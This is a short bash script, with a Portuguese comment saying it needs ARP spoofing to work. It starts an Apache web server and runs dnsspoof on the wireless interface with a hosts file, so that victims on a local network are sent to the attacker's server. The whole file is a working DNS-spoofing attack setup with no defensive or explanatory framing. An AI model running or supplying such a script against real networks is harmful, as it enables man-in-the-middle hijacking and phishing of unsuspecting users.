#!/bin/bash
##precisa do arp burrao!
service apache2 start;
dnsspoof -i wlan0 -f hosts.txt;
#service apache2 stop;
